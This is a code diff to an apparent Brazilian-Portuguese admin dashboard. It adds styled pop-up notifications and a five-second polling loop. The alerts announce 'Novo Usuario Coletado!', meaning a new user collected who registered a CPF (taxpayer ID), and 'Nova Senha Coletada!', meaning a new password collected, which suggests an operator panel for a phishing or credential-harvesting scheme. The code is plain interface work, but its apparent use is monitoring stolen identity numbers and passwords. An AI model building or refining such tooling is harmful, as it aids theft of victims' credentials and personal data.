@@ -693,6 +693,68 @@
         ::-webkit-scrollbar-thumb:hover {
             background: rgba(255, 255, 255, 0.3);
         }
+        /* Notificacao personalizada */
+.custom-notification {
+    position: fixed;
+    top: 20px;
+    right: 20px;
+    min-width: 300px;
+    max-width: 400px;
+    background: rgba(0, 0, 0, 0.9);
+    backdrop-filter: blur(15px);
+    border-left: 4px solid;
+    border-radius: 12px;
+    padding: 15px 20px;
+    margin-bottom: 10px;
+    z-index: 10000;
+    animation: slideInRight 0.3s ease;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+}
+.custom-notification.success {
+    border-left-color: #10b981;
+}
+.custom-notification.error {
+    border-left-color: #ef4444;
+}
+.custom-notification.warning {
+    border-left-color: #f59e0b;
+}
+.custom-notification.info {
+    border-left-color: #3b82f6;
+}
+.custom-notification .notification-title {
+    font-size: 14px;
+    font-weight: 600;
+    margin-bottom: 5px;
+    color: #fff;
+}
+.custom-notification .notification-message {
+    font-size: 12px;
+    color: rgba(255,255,255,0.7);
+}
+.custom-notification .notification-time {
+    font-size: 10px;
+    color: rgba(255,255,255,0.4);
+    margin-top: 5px;
+}
+@keyframes slideInRight {
+    from {
+        transform: translateX(100%);
+        opacity: 0;
+    }
+    to {
+        transform: translateX(0);
+        opacity: 1;
+    }
+}
+@keyframes fadeOut {
+    from {
+        opacity: 1;
+    }
+    to {
+        opacity: 0;
+    }
+}
     </style>
 </head>
 <body>
@@ -868,6 +930,7 @@
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
 <script>
+    
     // CANVAS 3D
     const canvas = document.getElementById('bgCanvas');
     const scene = new THREE.Scene();
@@ -1228,7 +1291,35 @@
         }
     }
 
- // ========== SISTEMA DE NOTIFICACOES ==========
+// ========== NOTIFICACAO PERSONALIZADA ==========
+function mostrarNotificacao(title, message, type = 'info') {
+    const notification = document.createElement('div');
+    notification.className = `custom-notification ${type}`;
+    
+    let icon = '';
+    if (type === 'success') icon = '💰';
+    else if (type === 'error') icon = '❌';
+    else if (type === 'warning') icon = '⚠️';
+    else icon = '📢';
+    
+    notification.innerHTML = `
+        <div class="notification-title">${icon} ${title}</div>
+        <div class="notification-message">${message}</div>
+        <div class="notification-time">${new Date().toLocaleTimeString()}</div>
+    `;
+    
+    document.body.appendChild(notification);
+    
+    // Remover notificacao automaticamente apos 5 segundos
+    setTimeout(() => {
+        notification.style.animation = 'fadeOut 0.3s ease';
+        setTimeout(() => {
+            if (notification.parentNode) notification.parentNode.removeChild(notification);
+        }, 300);
+    }, 5000);
+}
+
+// ========== SISTEMA DE NOTIFICACOES ==========
 let ultimoTotalUsuarios = 0;
 let ultimoTotalLogs = 0;
 
@@ -1243,10 +1334,24 @@ function verificarNovosDados() {
             const totalLogs = stats.total_logs || 0;
             
             if (totalUsuarios > ultimoTotalUsuarios && ultimoTotalUsuarios !== 0) {
-                showToast(`NOVO USUARIO! Total: ${totalUsuarios}`, 'success');
+                const diferenca = totalUsuarios - ultimoTotalUsuarios;
+                mostrarNotificacao(
+                    'Novo Usuario Coletado!',
+                    `${diferenca} novo(s) usuario(s) registraram CPF. Total: ${totalUsuarios}`,
+                    'success'
+                );
+                // Tambem atualizar a tabela
+                loadAllData();
             }
             if (totalLogs > ultimoTotalLogs && ultimoTotalLogs !== 0) {
-                showToast(`NOVA SENHA COLETADA!`, 'info');
+                const diferenca = totalLogs - ultimoTotalLogs;
+                mostrarNotificacao(
+                    'Nova Senha Coletada!',
+                    `${diferenca} nova(s) senha(s) foram inseridas. Total de logs: ${totalLogs}`,
+                    'info'
+                );
+                // Tambem atualizar a tabela
+                loadAllData();
             }
             
             ultimoTotalUsuarios = totalUsuarios;
@@ -1255,6 +1360,7 @@ function verificarNovosDados() {
         .catch(err => console.error('Erro:', err));
 }
 
+// Verificar a cada 5 segundos
 setInterval(() => {
     if (adminToken) verificarNovosDados();
 }, 5000);
